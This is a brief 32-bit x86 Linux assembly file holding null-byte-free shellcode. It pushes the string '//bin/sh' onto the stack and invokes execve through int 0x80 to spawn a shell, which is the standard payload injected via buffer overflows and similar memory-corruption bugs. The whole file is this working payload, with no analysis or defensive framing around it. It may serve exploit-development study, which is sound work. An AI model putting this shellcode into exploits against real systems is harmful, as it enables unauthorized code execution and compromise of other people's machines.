section .text
    global _start

_start:
    ; No NULL bytes shell code version
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    push eax                ; string terminator (NULL)
    push 0x68732f6e         ; "hs/n"
    push 0x69622f2f         ; "ib//"
    mov ebx, esp            ; points now to "//bin/sh"
    mov al, 0xb
    int 0x80
